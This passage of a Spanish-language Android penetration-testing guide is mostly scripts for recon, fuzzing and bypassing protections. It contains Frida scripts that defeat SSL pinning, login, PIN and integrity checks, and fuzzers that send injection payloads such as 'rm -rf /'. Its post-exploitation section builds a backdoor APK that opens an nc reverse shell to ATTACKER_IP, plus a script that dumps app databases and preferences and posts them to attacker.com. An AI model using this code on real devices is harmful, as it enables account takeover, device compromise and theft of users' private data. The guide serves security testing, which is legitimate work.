adb shell dumpsys package $PACKAGE | grep -A 5 "ContentProvider"

# Probar acceso a proveedores comunes
providers=(
    "content://$PACKAGE.provider/users"
    "content://$PACKAGE.provider/settings"
    "content://$PACKAGE.provider/files"
    "content://$PACKAGE.provider/database"
)

for provider in "${providers[@]}"; do
    echo "[+] Testing provider: $provider"
    adb shell content query --uri "$provider" 2>/dev/null
done
```

### 4. Testing de Servicios Exportados

**Enumerar y probar servicios:**
```bash
# Listar servicios exportados
grep -A 5 -B 5 "service.*exported.*true" extracted/app_apktool/AndroidManifest.xml

# Probar inicio de servicios
adb shell am startservice -n com.target.app/.VulnerableService \
    --es "command" "malicious_command"

# Monitorear respuesta del servicio
adb logcat | grep "VulnerableService"
```

---

## Herramientas de Automatización

### Script de Reconocimiento Completo

```python
#!/usr/bin/env python3
# mobile_recon.py

import subprocess
import json
import xml.etree.ElementTree as ET
import os
import sys

class MobileRecon:
    def __init__(self, apk_path, package_name):
        self.apk_path = apk_path
        self.package_name = package_name
        self.results = {}
    
    def run_command(self, cmd):
        """Ejecutar comando y retornar output"""
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return f"Error: {e}"
    
    def extract_apk_info(self):
        """Extraer información básica de la APK"""
        print("[+] Extrayendo información básica...")
        
        # Información básica con aapt
        basic_info = self.run_command(f"aapt dump badging {self.apk_path}")
        permissions = self.run_command(f"aapt dump permissions {self.apk_path}")
        
        self.results['basic_info'] = basic_info
        self.results['permissions'] = permissions.split('\n')
        
        # Analizar permisos peligrosos
        dangerous_perms = []
        critical_perms = [
            'CAMERA', 'RECORD_AUDIO', 'READ_CONTACTS', 'WRITE_CONTACTS',
            'ACCESS_FINE_LOCATION', 'READ_SMS', 'SEND_SMS', 'CALL_PHONE'
        ]
        
        for perm in self.results['permissions']:
            for critical in critical_perms:
                if critical in perm:
                    dangerous_perms.append(perm.strip())
        
        self.results['dangerous_permissions'] = dangerous_perms
    
    def static_analysis(self):
        """Realizar análisis estático completo"""
        print("[+] Ejecutando análisis estático...")
        
        # Descompilar con JADX
        output_dir = f"analysis/{self.package_name}/jadx_output"
        self.run_command(f"jadx -d {output_dir} {self.apk_path}")
        
        # Buscar strings sensibles
        sensitive_patterns = [
            r'password.*=.*["\']([^"\']+)["\']',
            r'token.*=.*["\']([^"\']+)["\']',
            r'api.*key.*=.*["\']([^"\']+)["\']',
            r'https?://[^\s<>"{}|\\^`\[\]]+'
        ]
        
        findings = []
        for root, dirs, files in os.walk(output_dir):
            for file in files:
                if file.endswith('.java'):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8') as f:
                            content = f.read()
                            for pattern in sensitive_patterns:
                                import re
                                matches = re.findall(pattern, content, re.IGNORECASE)
                                for match in matches:
                                    findings.append({
                                        'file': file_path,
                                        'pattern': pattern,
                                        'match': match
                                    })
                    except:
                        continue
        
        self.results['static_findings'] = findings
    
    def generate_report(self):
        """Generar reporte en formato JSON"""
        report_file = f"reports/{self.package_name}_recon.json"
        os.makedirs("reports", exist_ok=True)
        
        with open(report_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"[+] Reporte generado: {report_file}")
    
    def run_full_analysis(self):
        """Ejecutar análisis completo"""
        self.extract_apk_info()
        self.static_analysis()
        self.generate_report()
        
        # Mostrar resumen
        print("\n=== RESUMEN DE VULNERABILIDADES ===")
        print(f"Permisos peligrosos: {len(self.results['dangerous_permissions'])}")
        print(f"Strings sensibles: {len(self.results['static_findings'])}")

# Uso
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python3 mobile_recon.py <apk_path> <package_name>")
        sys.exit(1)
    
    recon = MobileRecon(sys.argv[1], sys.argv[2])
    recon.run_full_analysis()
```

### Automatización de Frida Scripts

**Manager de scripts Frida:**
```python
#!/usr/bin/env python3
# frida_manager.py

import frida
import sys
import time

class FridaManager:
    def __init__(self, package_name):
        self.package_name = package_name
        self.device = frida.get_usb_device()
        self.session = None
    
    def attach_to_app(self):
        """Adjuntar a aplicación en ejecución"""
        try:
            self.session = self.device.attach(self.package_name)
            print(f"[+] Adjuntado a {self.package_name}")
        except frida.ProcessNotFoundError:
            print(f"[-] Aplicación {self.package_name} no está ejecutándose")
            return False
        return True
    
    def spawn_app(self):
        """Iniciar aplicación con Frida"""
        try:
            pid = self.device.spawn([self.package_name])
            self.session = self.device.attach(pid)
            self.device.resume(pid)
            print(f"[+] Aplicación iniciada con PID: {pid}")
        except Exception as e:
            print(f"[-] Error al iniciar aplicación: {e}")
            return False
        return True
    
    def load_script(self, script_path):
        """Cargar y ejecutar script Frida"""
        try:
            with open(script_path, 'r') as f:
                script_code = f.read()
            
            script = self.session.create_script(script_code)
            script.on('message', self.on_message)
            script.load()
            print(f"[+] Script cargado: {script_path}")
            return script
        except Exception as e:
            print(f"[-] Error cargando script: {e}")
            return None
    
    def on_message(self, message, data):
        """Manejar mensajes del script"""
        if message['type'] == 'send':
            print(f"[FRIDA] {message['payload']}")
        elif message['type'] == 'error':
            print(f"[ERROR] {message['stack']}")
    
    def interactive_mode(self):
        """Modo interactivo para comandos Frida"""
        print("\n[+] Modo interactivo activado (Ctrl+C para salir)")
        try:
            while True:
                cmd = input("frida> ")
                if cmd.strip():
                    script = self.session.create_script(f"console.log({cmd});")
                    script.load()
        except KeyboardInterrupt:
            print("\n[+] Saliendo del modo interactivo")

# Uso
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 frida_manager.py <package_name> [script_path]")
        sys.exit(1)
    
    manager = FridaManager(sys.argv[1])
    
    if manager.attach_to_app() or manager.spawn_app():
        if len(sys.argv) > 2:
            manager.load_script(sys.argv[2])
        manager.interactive_mode()
```

---

## Testing de APIs y Endpoints

### Enumeración de Endpoints

**Extracción de URLs de código:**
```bash
# Script para extraer todas las URLs
#!/bin/bash
# extract_urls.sh

APP_DIR=$1

echo "[+] Extrayendo URLs de $APP_DIR"

# URLs en código Java
find "$APP_DIR" -name "*.java" -exec grep -H -o -E 'https?://[^\s<>"{}|\\^`\[\]]+' {} \; > urls_java.txt

# URLs en archivos de recursos
find "$APP_DIR" -name "*.xml" -exec grep -H -o -E 'https?://[^\s<>"{}|\\^`\[\]]+' {} \; > urls_resources.txt

# URLs en strings
find "$APP_DIR" -name "strings.xml" -exec grep -H -o -E 'https?://[^\s<>"{}|\\^`\[\]]+' {} \; > urls_strings.txt

# Consolidar y limpiar
cat urls_*.txt | cut -d: -f2 | sort -u > all_urls.txt

echo "[+] URLs extraídas en all_urls.txt"
```

**Testing automático de endpoints:**
```python
#!/usr/bin/env python3
# endpoint_tester.py

import requests
import urllib3
from urllib.parse import urlparse
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class EndpointTester:
    def __init__(self, urls_file):
        self.urls = self.load_urls(urls_file)
        self.session = requests.Session()
        self.session.verify = False
        
    def load_urls(self, file_path):
        """Cargar URLs desde archivo"""
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    
    def test_endpoint(self, url):
        """Probar endpoint individual"""
        try:
            # GET request
            response = self.session.get(url, timeout=10)
            
            result = {
                'url': url,
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'content_length': len(response.content),
                'response_time': response.elapsed.total_seconds()
            }
            
            # Verificar información sensible en respuesta
            sensitive_keywords = ['password', 'token', 'api_key', 'secret', 'admin']
            response_text = response.text.lower()
            
            found_sensitive = []
            for keyword in sensitive_keywords:
                if keyword in response_text:
                    found_sensitive.append(keyword)
            
            if found_sensitive:
                result['sensitive_data'] = found_sensitive
            
            return result
            
        except Exception as e:
            return {'url': url, 'error': str(e)}
    
    def run_tests(self):
        """Ejecutar pruebas en todas las URLs"""
        results = []
        
        for url in self.urls:
            print(f"[+] Testing: {url}")
            result = self.test_endpoint(url)
            results.append(result)
            
            # Mostrar resultados interesantes
            if 'sensitive_data' in result:
                print(f"    [!] Datos sensibles encontrados: {result['sensitive_data']}")
            elif result.get('status_code') == 200:
                print(f"    [+] Respuesta exitosa ({result['content_length']} bytes)")
        
        # Guardar resultados
        with open('endpoint_test_results.json', 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\n[+] Resultados guardados en endpoint_test_results.json")

# Uso
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python3 endpoint_tester.py <urls_file>")
        sys.exit(1)
    
    tester = EndpointTester(sys.argv[1])
    tester.run_tests()
```

---

## Testing de Bypass de Protecciones

### Anti-Debugging Bypass

**Script Frida completo:**
```javascript
// anti_debug_bypass.js
Java.perform(function() {
    console.log("[+] Anti-debugging bypass iniciado");
    
    // Bypass Debug.isDebuggerConnected()
    var Debug = Java.use("android.os.Debug");
    Debug.isDebuggerConnected.implementation = function() {
        console.log("[+] Debug.isDebuggerConnected() bypassed");
        return false;
    };
    
    // Bypass ApplicationInfo.FLAG_DEBUGGABLE
    var ApplicationInfo = Java.use("android.content.pm.ApplicationInfo");
    ApplicationInfo.flags.value = ApplicationInfo.flags.value & ~2; // Remove FLAG_DEBUGGABLE
    
    // Bypass TracerPid check
    var System = Java.use("java.lang.System");
    System.getProperty.implementation = function(property) {
        if (property === "ro.debuggable") {
            console.log("[+] ro.debuggable property bypassed");
            return "0";
        }
        return this.getProperty(property);
    };
    
    // Hook File operations para /proc/self/status
    var File = Java.use("java.io.File");
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        if (path.indexOf("/proc/") !== -1 && path.indexOf("status") !== -1) {
            console.log("[+] /proc/self/status access bypassed");
            return false;
        }
        return this.exists();
    };
    
    console.log("[+] Anti-debugging bypass completo");
});
```

### Certificate Pinning Bypass Universal

```javascript
// ssl_kill_switch.js - Bypass universal de SSL pinning
Java.perform(function() {
    console.log("[+] Universal SSL Bypass iniciado");
    
    // 1. Bypass para OkHttp 3.x
    try {
        var CertificatePinner = Java.use("okhttp3.CertificatePinner");
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
            console.log("[+] OkHttp3 Certificate Pinning bypassed for: " + hostname);
            return;
        };
    } catch(e) {}
    
    // 2. Bypass para HttpsURLConnection
    try {
        var HttpsURLConnection = Java.use("javax.net.ssl.HttpsURLConnection");
        HttpsURLConnection.setDefaultHostnameVerifier.implementation = function(hostnameVerifier) {
            console.log("[+] HttpsURLConnection HostnameVerifier bypassed");
            return null;
        };
        
        HttpsURLConnection.setSSLSocketFactory.implementation = function(socketFactory) {
            console.log("[+] HttpsURLConnection SSLSocketFactory bypassed");
            return null;
        };
    } catch(e) {}
    
    // 3. Bypass para Apache HTTP Client
    try {
        var DefaultHttpClient = Java.use("org.apache.http.impl.client.DefaultHttpClient");
        DefaultHttpClient.execute.overload('org.apache.http.client.methods.HttpUriRequest').implementation = function(request) {
            console.log("[+] Apache HTTP Client request intercepted");
            return this.execute(request);
        };
    } catch(e) {}
    
    // 4. Bypass genérico de TrustManager
    var TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    var SSLContext = Java.use("javax.net.ssl.SSLContext");
    
    var TrustManagerArray = Java.array("javax.net.ssl.TrustManager", [
        Java.registerClass({
            name: "com.bypass.TrustManager",
            implements: [TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {
                    console.log("[+] Server certificate validation bypassed");
                },
                getAcceptedIssuers: function() {
                    return Java.array("java.security.cert.X509Certificate", []);
                }
            }
        }).$new()
    ]);
    
    // Aplicar TrustManager personalizado
    SSLContext.getInstance.overload('java.lang.String').implementation = function(protocol) {
        var context = this.getInstance(protocol);
        context.init(null, TrustManagerArray, null);
        console.log("[+] Custom TrustManager applied");
        return context;
    };
    
    console.log("[+] Universal SSL Bypass activado");
});
```

---

## Técnicas de Evasión y Steganografía

### Detección de Ofuscación

**Análizar código ofuscado:**
```bash
# Buscar patrones de ofuscación
grep -r -E "\\u[0-9a-fA-F]{4}" extracted/jadx_output/

# Buscar nombres de clases/métodos sospechosos
find extracted/jadx_output/ -name "*.java" -exec grep -l -E "(^class [a-z]$|^[a-z]\(\))" {} \;

# Detectar strings encriptados/codificados
strings app.apk | grep -E "^[A-Za-z0-9+/]{20,}={0,2}$" > base64_strings.txt
```

**Decodificador de strings:**
```python
#!/usr/bin/env python3
# string_decoder.py

import base64
import binascii
import json
import re

def decode_strings(input_file):
    """Intentar decodificar strings encontrados"""
    
    with open(input_file, 'r') as f:
        strings = [line.strip() for line in f]
    
    decoded = []
    
    for string in strings:
        result = {'original': string, 'decoded': []}
        
        # Base64 decode
        try:
            b64_decoded = base64.b64decode(string).decode('utf-8')
            if b64_decoded.isprintable():
                result['decoded'].append(('base64', b64_decoded))
        except:
            pass
        
        # Hex decode
        try:
            hex_decoded = binascii.unhexlify(string).decode('utf-8')
            if hex_decoded.isprintable():
                result['decoded'].append(('hex', hex_decoded))
        except:
            pass
        
        # URL decode
        try:
            from urllib.parse import unquote
            url_decoded = unquote(string)
            if url_decoded != string and url_decoded.isprintable():
                result['decoded'].append(('url', url_decoded))
        except:
            pass
        
        if result['decoded']:
            decoded.append(result)
    
    return decoded

# Uso
decoded_results = decode_strings('base64_strings.txt')
for result in decoded_results:
    if result['decoded']:
        print(f"Original: {result['original']}")
        for method, decoded in result['decoded']:
            print(f"  {method}: {decoded}")
```

---

## Testing de Vulnerabilidades Específicas

### 1. Insecure Data Storage

**Script de análisis de almacenamiento:**
```bash
#!/bin/bash
# storage_analyzer.sh

PACKAGE=$1
DEVICE_DATA="/data/data/$PACKAGE"

echo "[+] Analizando almacenamiento inseguro para $PACKAGE"

# 1. Verificar SharedPreferences
echo "[+] Verificando SharedPreferences..."
adb shell "su -c 'find $DEVICE_DATA/shared_prefs -name \"*.xml\" -exec cat {} \;'" | grep -i -E "(password|token|key|secret|pin)"

# 2. Verificar bases de datos
echo "[+] Verificando bases de datos..."
adb shell "su -c 'find $DEVICE_DATA -name \"*.db\" -exec sqlite3 {} \".dump\" \;'" | grep -i -E "(password|token|key|secret|pin)"

# 3. Verificar archivos temporales
echo "[+] Verificando archivos temporales..."
adb shell "su -c 'find $DEVICE_DATA/cache -type f -exec cat {} \;'" | grep -i -E "(password|token|key|secret)"

# 4. Verificar logs internos
echo "[+] Verificando logs internos..."
adb shell "su -c 'find $DEVICE_DATA -name \"*.log\" -o -name \"*.txt\" -exec cat {} \;'" | grep -i -E "(password|token|key|secret)"

# 5. Verificar external storage
echo "[+] Verificando almacenamiento externo..."
adb shell "find /sdcard/Android/data/$PACKAGE -type f -exec cat {} \;" 2>/dev/null | grep -i -E "(password|token|key|secret)"
```

### 2. Weak Cryptography Detection

**Análisis de implementaciones criptográficas:**
```python
#!/usr/bin/env python3
# crypto_analyzer.py

import re
import os

class CryptoAnalyzer:
    def __init__(self, source_dir):
        self.source_dir = source_dir
        self.vulnerabilities = []
    
    def analyze_crypto_usage(self):
        """Analizar uso de criptografía en el código"""
        
        # Patrones de algoritmos débiles
        weak_patterns = {
            'MD5': r'MessageDigest\.getInstance\("MD5"\)',
            'SHA1': r'MessageDigest\.getInstance\("SHA-?1"\)',
            'DES': r'Cipher\.getInstance\("DES',
            'RC4': r'Cipher\.getInstance\("RC4',
            'ECB_Mode': r'Cipher\.getInstance\("[^"]*ECB[^"]*"\)',
            'Hardcoded_Keys': r'(private|secret).*key.*=.*["\']([A-Za-z0-9+/]{16,})["\']'
        }
        
        for root, dirs, files in os.walk(self.source_dir):
            for file in files:
                if file.endswith('.java'):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8') as f:
                            content = f.read()
                            
                            for vuln_type, pattern in weak_patterns.items():
                                matches = re.findall(pattern, content, re.IGNORECASE)
                                for match in matches:
                                    self.vulnerabilities.append({
                                        'type': vuln_type,
                                        'file': file_path,
                                        'match': match,
                                        'severity': self.get_severity(vuln_type)
                                    })
                    except:
                        continue
    
    def get_severity(self, vuln_type):
        """Determinar severidad de vulnerabilidad"""
        critical = ['DES', 'RC4', 'Hardcoded_Keys']
        high = ['MD5', 'SHA1', 'ECB_Mode']
        
        if vuln_type in critical:
            return 'CRITICAL'
        elif vuln_type in high:
            return 'HIGH'
        return 'MEDIUM'
    
    def generate_report(self):
        """Generar reporte de vulnerabilidades crypto"""
        print("\n=== ANÁLISIS CRIPTOGRÁFICO ===")
        
        severity_count = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0}
        
        for vuln in self.vulnerabilities:
            severity_count[vuln['severity']] += 1
            print(f"[{vuln['severity']}] {vuln['type']} en {vuln['file']}")
            print(f"    Match: {vuln['match']}\n")
        
        print(f"Total vulnerabilidades: {len(self.vulnerabilities)}")
        print(f"Críticas: {severity_count['CRITICAL']}")
        print(f"Altas: {severity_count['HIGH']}")
        print(f"Medias: {severity_count['MEDIUM']}")

# Uso
analyzer = CryptoAnalyzer('extracted/jadx_output')
analyzer.analyze_crypto_usage()
analyzer.generate_report()
```

### 3. Intent Injection Testing

**Fuzzer de Intent maliciosos:**
```python
#!/usr/bin/env python3
# intent_fuzzer.py

import subprocess
import time

class IntentFuzzer:
    def __init__(self, package_name):
        self.package = package_name
        self.vulnerable_components = []
    
    def discover_components(self):
        """Descubrir componentes exportados"""
        # Extraer componentes del manifiesto
        cmd = f"aapt dump xmltree app.apk AndroidManifest.xml | grep -A 20 'exported.*true'"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        # Parser simple (mejorar según necesidades)
        components = []
        lines = result.stdout.split('\n')
        for i, line in enumerate(lines):
            if 'android:name' in line and 'Activity' in line:
                component = line.split('=')[1].strip('"')
                components.append(component)
        
        return components
    
    def test_intent_injection(self, component):
        """Probar inyección de Intent en componente específico"""
        payloads = [
            # Path traversal
            {"extra_path": "../../../etc/passwd"},
            {"file_path": "file:///data/data/com.target.app/databases/"},
            
            # XSS en WebView
            {"url": "javascript:alert('XSS')"},
            {"data": "<script>alert('XSS')</script>"},
            
            # SQL Injection
            {"id": "1' OR '1'='1"},
            {"query": "'; DROP TABLE users; --"},
            
            # Command Injection
            {"command": "; cat /etc/passwd"},
            {"filename": "test.txt; rm -rf /"}
        ]
        
        for payload in payloads:
            print(f"[+] Testing payload: {payload}")
            
            # Construir comando adb
            cmd = f"adb shell am start -n {self.package}/{component}"
            for key, value in payload.items():
                cmd += f" --es {key} '{value}'"
            
            # Ejecutar y monitorear
            subprocess.run(cmd, shell=True)
            time.sleep(2)
            
            # Verificar logs para errores/respuestas
            log_cmd = "adb logcat -d | tail -10"
            log_result = subprocess.run(log_cmd, shell=True, capture_output=True, text=True)
            
            if any(keyword in log_result.stdout.lower() for keyword in ['error', 'exception', 'crash']):
                print(f"    [!] Posible vulnerabilidad detectada")
                self.vulnerable_components.append((component, payload))
    
    def run_fuzzing(self):
        """Ejecutar fuzzing completo"""
        components = self.discover_components()
        
        for component in components:
            print(f"\n[+] Testing component: {component}")
            self.test_intent_injection(component)
        
        print(f"\n[+] Componentes vulnerables: {len(self.vulnerable_components)}")
        for comp, payload in self.vulnerable_components:
            print(f"    {comp}: {payload}")

# Uso
fuzzer = IntentFuzzer('com.target.app')
fuzzer.run_fuzzing()
```

---

## Testing de Autenticación y Autorización

### Bypass de Autenticación Local

**Script Frida para bypass de login:**
```javascript
// auth_bypass.js
Java.perform(function() {
    console.log("[+] Authentication bypass iniciado");
    
    // 1. Bypass de validación de credenciales
    try {
        var LoginManager = Java.use("com.target.app.auth.LoginManager");
        LoginManager.validateLogin.implementation = function(username, password) {
            console.log("[+] Login bypassed para usuario: " + username);
            return true; // Siempre retornar login exitoso
        };
    } catch(e) {
        console.log("[-] LoginManager no encontrado");
    }
    
    // 2. Bypass de verificación de PIN
    try {
        var PinVerification = Java.use("com.target.app.security.PinVerification");
        PinVerification.verifyPin.implementation = function(pin) {
            console.log("[+] PIN verification bypassed: " + pin);
            return true;
        };
    } catch(e) {}
    
    // 3. Bypass de token validation
    try {
        var TokenValidator = Java.use("com.target.app.auth.TokenValidator");
        TokenValidator.isValidToken.implementation = function(token) {
            console.log("[+] Token validation bypassed: " + token);
            return true;
        };
    } catch(e) {}
    
    // 4. Hook SharedPreferences para modificar estado de login
    var SharedPreferences = Java.use("android.content.SharedPreferences");
    SharedPreferences.getBoolean.implementation = function(key, defValue) {
        if (key === "isLoggedIn" || key === "authenticated") {
            console.log("[+] Forced login state: true");
            return true;
        }
        return this.getBoolean(key, defValue);
    };
});
```

### Testing de Session Management

**Análisis de manejo de sesiones:**
```bash
# Extraer tokens de sesión
adb shell "su -c 'grep -r token /data/data/com.target.app/'"

# Monitorear renovación de tokens
adb logcat | grep -i -E "(token|session|refresh|expire)"
```

---

## Análisis de Componentes Específicos

### WebView Security Testing

**Detector de configuraciones inseguras:**
```javascript
// webview_security.js
Java.perform(function() {
    console.log("[+] WebView security analysis iniciado");
    
    var WebView = Java.use("android.webkit.WebView");
    var WebSettings = Java.use("android.webkit.WebSettings");
    
    // Hook configuraciones críticas
    WebSettings.setJavaScriptEnabled.implementation = function(enabled) {
        console.log("[+] JavaScript enabled: " + enabled);
        return this.setJavaScriptEnabled(enabled);
    };
    
    WebSettings.setAllowFileAccess.implementation = function(allow) {
        console.log("[!] File access enabled: " + allow);
        if (allow) {
            console.log("[!] VULNERABILIDAD: File access habilitado");
        }
        return this.setAllowFileAccess(allow);
    };
    
    WebSettings.setAllowContentAccess.implementation = function(allow) {
        console.log("[+] Content access: " + allow);
        return this.setAllowContentAccess(allow);
    };
    
    WebSettings.setAllowFileAccessFromFileURLs.implementation = function(allow) {
        console.log("[!] File access from file URLs: " + allow);
        if (allow) {
            console.log("[!] VULNERABILIDAD: Acceso a archivos desde file:// URLs");
        }
        return this.setAllowFileAccessFromFileURLs(allow);
    };
    
    // Hook carga de URLs
    WebView.loadUrl.overload('java.lang.String').implementation = function(url) {
        console.log("[+] WebView loading: " + url);
        
        // Verificar esquemas peligrosos
        if (url.startsWith("file://") || url.startsWith("javascript:")) {
            console.log("[!] ESQUEMA PELIGROSO detectado: " + url);
        }
        
        return this.loadUrl(url);
    };
    
    // Hook JavaScript interfaces
    WebView.addJavascriptInterface.implementation = function(obj, name) {
        console.log("[!] JavaScript interface añadido: " + name);
        console.log("[!] VULNERABILIDAD POTENCIAL: Interface JS expuesto");
        return this.addJavascriptInterface(obj, name);
    };
});
```

### Content Provider Security Testing

**Testing automático de Content Providers:**
```python
#!/usr/bin/env python3
# content_provider_tester.py

import subprocess
import re

class ContentProviderTester:
    def __init__(self, package_name):
        self.package = package_name
        self.providers = []
        self.vulnerabilities = []
    
    def discover_providers(self):
        """Descubrir Content Providers exportados"""
        # Extraer del manifiesto
        cmd = f"aapt dump xmltree app.apk AndroidManifest.xml | grep -A 10 -B 10 provider"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        # Parser de autoridades (authorities)
        authorities = re.findall(r'android:authorities.*="([^"]+)"', result.stdout)
        
        for authority in authorities:
            self.providers.append(authority)
            print(f"[+] Provider encontrado: {authority}")
    
    def test_provider_access(self, authority):
        """Probar acceso a Content Provider"""
        test_paths = [
            "",
            "users",
            "settings", 
            "config",
            "database",
            "../../../etc/passwd",
            "users/1 OR 1=1",
            "'; DROP TABLE users; --"
        ]
        
        for path in test_paths:
            uri = f"content://{authority}/{path}"
            print(f"[+] Testing URI: {uri}")
            
            # Intentar query
            cmd = f'adb shell content query --uri "{uri}"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0 and result.stdout.strip():
                print(f"    [!] ACCESO EXITOSO: {result.stdout[:100]}...")
                self.vulnerabilities.append({
                    'type': 'Content Provider Access',
                    'uri': uri,
                    'response': result.stdout[:500]
                })
            elif "Exception" in result.stderr:
                print(f"    [!] Exception detectada: {result.stderr[:100]}...")
                self.vulnerabilities.append({
                    'type': 'Content Provider Exception',
                    'uri': uri,
                    'error': result.stderr[:200]
                })
    
    def run_tests(self):
        """Ejecutar todas las pruebas"""
        self.discover_providers()
        
        for provider in self.providers:
            print(f"\n[+] Testing provider: {provider}")
            self.test_provider_access(provider)
        
        print(f"\n[+] Vulnerabilidades encontradas: {len(self.vulnerabilities)}")
        for vuln in self.vulnerabilities:
            print(f"    {vuln['type']}: {vuln['uri']}")

# Uso
tester = ContentProviderTester('com.target.app')
tester.run_tests()
```

---

## Técnicas de Post-Explotación

### Persistence en Dispositivo

**Instalación de backdoor persistente:**
```bash
#!/bin/bash
# persistence_installer.sh

PACKAGE=$1

echo "[+] Configurando persistencia para $PACKAGE"

# 1. Crear APK maliciosa persistente
cat > MainActivity.java << EOF
package com.persistence.backdoor;

import android.app.Activity;
import android.os.Bundle;
import java.io.IOException;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Ejecutar shell reverso
        new Thread(new Runnable() {
            public void run() {
                try {
                    Runtime.getRuntime().exec("su -c 'nc ATTACKER_IP 4444 -e /system/bin/sh'");
                } catch (IOException e) {}
            }
        }).start();
        
        finish(); // Cerrar actividad inmediatamente
    }
}
EOF

# 2. Configurar recepción en atacante
echo "[+] Configurar listener en atacante:"
echo "nc -lvp 4444"
```

### Data Exfiltration

**Script de exfiltración automática:**
```python
#!/usr/bin/env python3
# data_exfiltrator.py

import subprocess
import base64
import requests
import json

class DataExfiltrator:
    def __init__(self, package_name, server_url):
        self.package = package_name
        self.server_url = server_url
        self.extracted_data = {}
    
    def extract_databases(self):
        """Extraer y exfiltrar bases de datos"""
        cmd = f"adb shell 'su -c \"find /data/data/{self.package} -name *.db\"'"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        db_files = result.stdout.strip().split('\n')
        
        for db_file in db_files:
            if db_file.strip():
                print(f"[+] Extrayendo: {db_file}")
                
                # Dump de base de datos
                dump_cmd = f"adb shell 'su -c \"sqlite3 {db_file} .dump\"'"
                dump_result = subprocess.run(dump_cmd, shell=True, capture_output=True, text=True)
                
                if dump_result.stdout:
                    # Codificar en base64 para exfiltración
                    encoded_data = base64.b64encode(dump_result.stdout.encode()).decode()
                    self.extracted_data[db_file] = encoded_data
    
    def extract_shared_prefs(self):
        """Extraer SharedPreferences"""
        cmd = f"adb shell 'su -c \"find /data/data/{self.package}/shared_prefs -name *.xml -exec cat {{}} \\;\"'"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if result.stdout:
            encoded_prefs = base64.b64encode(result.stdout.encode()).decode()
            self.extracted_data['shared_preferences'] = encoded_prefs
    
    def exfiltrate_data(self):
        """Enviar datos extraídos al servidor"""
        if not self.extracted_data:
            print("[-] No hay datos para exfiltrar")
            return
        
        try:
            payload = {
                'package': self.package,
                'data': self.extracted_data,
                'timestamp': time.time()
            }
            
            response = requests.post(
                f"{self.server_url}/collect",
                json=payload,
                timeout=30
            )
            
            if response.status_code == 200:
                print(f"[+] Datos exfiltrados exitosamente")
            else:
                print(f"[-] Error en exfiltración: {response.status_code}")
                
        except Exception as e:
            print(f"[-] Error de conexión: {e}")
    
    def run_exfiltration(self):
        """Ejecutar proceso completo"""
        print(f"[+] Iniciando exfiltración de {self.package}")
        self.extract_databases()
        self.extract_shared_prefs()
        self.exfiltrate_data()

# Uso
exfiltrator = DataExfiltrator('com.target.app', 'http://attacker.com')
exfiltrator.run_exfiltration()
```

---

## Testing de Protecciones Anti-Tamper

### Detección de Modificaciones

**Verificar integridad de APK:**
```bash
#!/bin/bash
# integrity_checker.sh

APK_PATH=$1

echo "[+] Verificando integridad de $APK_PATH"

# 1. Verificar firma digital
jarsigner -verify -verbose -certs "$APK_PATH"

# 2. Calcular hash de APK
echo "[+] Hash SHA256:"
sha256sum "$APK_PATH"

# 3. Verificar certificado
echo "[+] Información del certificado:"
unzip -p "$APK_PATH" META-INF/CERT.RSA | openssl pkcs7 -inform DER -print_certs -text

# 4. Verificar si APK fue modificada
echo "[+] Verificando modificaciones..."
apktool d "$APK_PATH" -o temp_check
if grep -r "# This file was automatically generated" temp_check/; then
    echo "[!] APK fue recompilada con APKTool"
fi

rm -rf temp_check
```

**Bypass de verificación de integridad:**
```javascript
// integrity_bypass.js
Java.perform(function() {
    console.log("[+] Integrity check bypass iniciado");
    
    // Bypass PackageManager signature verification
    var PackageManager = Java.use("android.content.pm.PackageManager");
    PackageManager.checkSignatures.overload('java.lang.String', 'java.lang.String').implementation = function(pkg1, pkg2) {
        console.log("[+] Signature check bypassed");
        return 0; // SIGNATURE_MATCH
    };
    
    // Bypass CRC checks
    var ZipFile = Java.use("java.util.zip.ZipFile");
    ZipFile.getEntry.implementation = function(name) {
        var entry = this.getEntry(name);
        if (entry != null) {
            // Modificar CRC si es necesario
            console.log("[+] ZipEntry accessed: " + name);
        }
        return entry;
    };
    
    // Bypass MessageDigest (hash verification)
    var MessageDigest = Java.use("java.security.MessageDigest");
    MessageDigest.digest.overload('[B').implementation = function(input) {
        var algorithm = this.getAlgorithm();
        console.log("[+] Hash calculation bypassed: " + algorithm);
        
        // Retornar hash esperado si es verificación de integridad
        if (algorithm === "SHA-256" || algorithm === "MD5") {
            // Aquí podrías retornar un hash específico
            console.log("[+] Returning modified hash");
        }
        
        return this.digest(input);
    };
});
```

---

## Documentación y Reporting

### Template de Reporte Profesional

```markdown
# Reporte de Pentesting - Aplicación Móvil Android

## Información General

**Cliente:** [Nombre del cliente]
**Aplicación:** [Nombre de la aplicación]
**Versión:** [Versión de la aplicación]
**Package Name:** [com.example.app]
**Fecha de análisis:** [DD/MM/YYYY]
**Pentester:** [Nombre del pentester]

## Metodología

- **Framework utilizado:** OWASP Mobile Security Testing Guide (MSTG) v1.04
- **Tipo de análisis:** Estático y Dinámico
- **Herramientas utilizadas:**
  - MobSF (Mobile Security Framework)
  - JADX (Java Decompiler)
